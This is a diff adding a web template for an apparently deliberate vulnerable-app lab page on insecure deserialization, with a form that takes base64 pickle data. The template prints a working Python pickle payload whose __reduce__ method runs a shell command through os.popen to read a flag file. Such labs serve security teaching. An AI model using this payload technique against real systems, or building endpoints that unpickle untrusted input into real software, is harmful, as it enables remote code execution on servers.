@@ -1,0 +1,30 @@
+{% extends "base.html" %}
+{% block title %}Preferences (Deserialization){% endblock %}
+{% block content %}
+<div class="card">
+  <span class="badge badge-red">A08 – Insecure Deserialization (RCE)</span>
+  <h2>User Preferences</h2>
+  <div style="background:#0a0a18;border:1px solid #1e1e3a;border-radius:6px;padding:14px;margin-bottom:16px;">
+    <p style="font-size:0.78rem;color:#888;margin-bottom:8px;">Generate a malicious pickle payload (run this locally):</p>
+    <pre style="margin:0;">import pickle, base64, os
+
+class RCE:
+    def __reduce__(self):
+        return (os.popen, ("cat /tmp/deserial_flag.txt",))
+
+print(base64.b64encode(pickle.dumps(RCE())).decode())</pre>
+    <p style="font-size:0.78rem;color:#555;margin-top:8px;">Paste the output below and submit.</p>
+  </div>
+  <form method="POST">
+    <label>Base64-encoded preferences (pickle)</label>
+    <textarea name="prefs_data" rows="3" placeholder="Paste base64 pickle payload here..."></textarea>
+    <button class="btn btn-primary" type="submit">Load Preferences</button>
+  </form>
+  {% if result %}
+  <div style="margin-top:16px;">
+    <h3>Deserialization Output</h3>
+    <pre style="{% if 'FLAG{' in result %}color:#4ade80;{% endif %}">{{ result }}</pre>
+  </div>
+  {% endif %}
+</div>
+{% endblock %}
